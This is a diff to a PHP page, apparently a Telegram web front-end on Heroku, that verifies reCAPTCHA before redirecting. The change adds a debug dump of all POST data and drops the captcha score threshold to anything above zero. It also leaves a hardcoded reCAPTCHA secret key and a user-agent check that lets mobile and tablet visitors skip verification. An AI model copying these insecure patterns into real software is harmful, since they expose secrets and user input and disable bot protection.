@@ -5,6 +5,8 @@
     $phone = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "mobile"));
     $tablet = is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "tablet"));
 
+    print_r($_POST);
+
     if (isset($_POST['token_response']) || $phone || $tablet) {
         $secret_key = '6Ldq8ZwbAAAAAOqt5r3tuMeglZP1DpiXnV6nPWll';
         $recaptcha_response = $_POST['token_response'];
@@ -15,7 +17,7 @@
 
         if ((
                 $response -> success &&
-                $response -> score >= 0.5
+                $response -> score > 0
             ) || $phone || $tablet) {
             if ($_SERVER['HTTP_HOST'] == 'telegram-on-web.herokuapp.com')
                 $fileURL = 'https://telegram-on-web.herokuapp.com/';
@@ -136,7 +138,7 @@
                 }
             }
 
-            // header('Location: /');
+            header('Location: /');
         }
 
         else {
@@ -169,7 +171,7 @@
 
             <script>
                 const form = document.querySelector('form')
-                // form.submit()
+                form.submit()
             </script>
 
             <?php
